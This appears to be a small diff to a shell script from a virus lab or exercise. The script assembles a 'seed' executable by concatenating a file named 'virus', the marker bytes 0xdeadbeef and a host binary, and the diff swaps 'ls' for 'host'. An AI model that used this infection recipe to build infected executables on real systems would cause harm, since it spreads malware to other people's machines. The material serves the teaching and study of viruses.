@@ -12,7 +12,7 @@ cp ls mls2
 
 cp virus seed
 printf '\xde\xad\xbe\xef' >> seed
-cat ls >> seed
+cat host >> seed
 
 chmod u+x seed
 
